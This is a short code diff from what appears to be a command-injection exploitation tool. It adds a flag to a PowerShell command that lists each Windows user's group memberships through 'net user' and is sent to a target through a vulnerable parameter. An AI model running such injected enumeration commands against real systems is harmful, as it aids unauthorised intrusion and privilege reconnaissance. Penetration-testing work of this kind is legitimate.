@@ -167,7 +167,7 @@ def system_users(separator, payload, TAG, delay, prefix, suffix, http_request_me
       for user in range(0, len(sys_users_list)):
         count = count + 1
         if menu.options.privileges:
-          cmd = "powershell.exe write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
+          cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','')"
           if alter_shell:
             cmd = cmd.replace("'","\\'")
           response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
